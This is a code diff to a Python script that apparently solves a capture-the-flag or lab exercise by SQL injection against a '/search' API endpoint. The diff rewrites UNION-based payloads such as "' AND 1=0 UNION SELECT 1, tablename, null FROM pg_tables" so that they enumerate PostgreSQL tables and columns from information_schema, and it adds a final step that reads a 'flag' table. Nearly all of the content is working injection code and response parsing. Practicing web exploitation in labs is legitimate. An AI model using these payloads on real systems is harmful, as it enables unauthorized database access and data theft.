@@ -31,8 +31,8 @@ def extract_tables():
     print("Step 1: Extracting Table Names")
     print("="*60)
     
-    # Payload to get table names - using CAST to ensure type compatibility
-    payload = "' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --"
+    # Payload to get table names - using integer 1 for first column to match id type
+    payload = "' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --"
     
     response = requests.get(
         f'{API_BASE_URL}/search',
@@ -48,8 +48,8 @@ def extract_tables():
         if data.get('success') and data.get('results'):
             tables = set()
             for result in data['results']:
-                table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
-                if table_name and table_name not in ['SERVER-01', 'WORKSTATION-05', 'LAPTOP-12']:  # Filter out actual data
+                table_name = result.get('computer_name') or list(result.values())[1] if len(result) > 1 else None
+                if table_name and table_name not in ['SERVER-01', 'WORKSTATION-05', 'LAPTOP-12', '1']:  # Filter out actual data and the integer 1
                     tables.add(str(table_name))
             
             print(f"\n✓ Found {len(tables)} tables:")
@@ -71,8 +71,8 @@ def extract_columns(table_name):
     print(f"Step 2: Extracting Columns for Table: {table_name}")
     print("="*60)
     
-    # Payload to get column names and types - using CAST for type compatibility
-    payload = f"' OR '1'='1' UNION SELECT CAST(column_name AS text), CAST(data_type AS text), null FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' --"
+    # Payload to get column names and types - using integer 1 for first column
+    payload = f"' AND 1=0 UNION SELECT 1, column_name, data_type FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' --"
     
     response = requests.get(
         f'{API_BASE_URL}/search',
@@ -88,8 +88,8 @@ def extract_columns(table_name):
         if data.get('success') and data.get('results'):
             columns = []
             for result in data['results']:
-                col_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
-                col_type = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
+                col_name = result.get('computer_name') or list(result.values())[1] if len(result) > 1 else None
+                col_type = result.get('ip_address') or list(result.values())[2] if len(result) > 2 else None
                 if col_name:
                     columns.append((str(col_name), str(col_type) if col_type else 'unknown'))
             
@@ -114,8 +114,8 @@ def extract_ddl(table_name):
     # Try to get DDL using pg_get_tabledef or similar PostgreSQL functions
     # Note: This might not work directly, so we'll construct it from column info
     
-    # First get all column details - using CAST for type compatibility
-    payload = f"' OR '1'='1' UNION SELECT CAST(column_name AS text), CAST(data_type AS text), CAST(character_maximum_length AS text) FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' ORDER BY ordinal_position --"
+    # First get all column details - using integer 1 for first column
+    payload = f"' AND 1=0 UNION SELECT 1, column_name, data_type FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' ORDER BY ordinal_position --"
     
     response = requests.get(
         f'{API_BASE_URL}/search',
@@ -131,9 +131,9 @@ def extract_ddl(table_name):
         if data.get('success') and data.get('results'):
             columns_info = []
             for result in data['results']:
-                col_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
-                col_type = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
-                col_length = list(result.values())[2] if len(result) > 2 else None
+                col_name = result.get('computer_name') or list(result.values())[1] if len(result) > 1 else None
+                col_type = result.get('ip_address') or list(result.values())[2] if len(result) > 2 else None
+                col_length = None  # Not extracting length in this version
                 
                 if col_name:
                     columns_info.append({
@@ -164,8 +164,8 @@ def extract_all_schema_info():
     print("Step 4: Extracting All Schema Information")
     print("="*60)
     
-    # Get all tables with their columns in one query - using CAST for type compatibility
-    payload = "' OR '1'='1' UNION SELECT CAST(table_name AS text), CAST(column_name AS text), CAST(data_type AS text) FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position --"
+    # Get all tables with their columns in one query - using integer 1 for first column
+    payload = "' AND 1=0 UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position --"
     
     response = requests.get(
         f'{API_BASE_URL}/search',
@@ -181,9 +181,9 @@ def extract_all_schema_info():
         if data.get('success') and data.get('results'):
             schema = {}
             for result in data['results']:
-                table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
-                col_name = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
-                col_type = list(result.values())[2] if len(result) > 2 else None
+                table_name = result.get('computer_name') or list(result.values())[1] if len(result) > 1 else None
+                col_name = result.get('ip_address') or list(result.values())[2] if len(result) > 2 else None
+                col_type = None  # Not extracting type in this version
                 
                 if table_name:
                     if table_name not in schema:
@@ -220,8 +220,8 @@ def main():
     
     if not tables:
         print("\n⚠ Could not extract tables. Trying alternative method...")
-        # Alternative: try pg_tables with proper casting
-        payload = "' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --"
+        # Alternative: try pg_tables
+        payload = "' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --"
         response = requests.get(
             f'{API_BASE_URL}/search',
             params={'username': 'admin', 'q': payload}
@@ -231,7 +231,7 @@ def main():
             if data.get('success') and data.get('results'):
                 tables = []
                 for result in data['results']:
-                    table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
+                    table_name = result.get('computer_name') or list(result.values())[1] if len(result) > 1 else None
                     if table_name:
                         tables.append(str(table_name))
                 print(f"\n✓ Found {len(tables)} tables using pg_tables:")
@@ -247,6 +247,24 @@ def main():
     
     # Extract all schema info
     extract_all_schema_info()
+    
+    # Extract the flag
+    print("\n" + "="*60)
+    print("Step 5: Extracting the Flag")
+    print("="*60)
+    payload = "' AND 1=0 UNION SELECT 1, flag, null FROM flag --"
+    response = requests.get(
+        f'{API_BASE_URL}/search',
+        params={'username': 'admin', 'q': payload}
+    )
+    if response.status_code == 200:
+        data = response.json()
+        if data.get('success') and data.get('results'):
+            for result in data['results']:
+                flag_value = result.get('computer_name') or result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
+                if flag_value:
+                    print(f"\n✓ Flag found: {flag_value}")
+                    break
     
     print("\n" + "="*60)
     print("Demo Complete!")
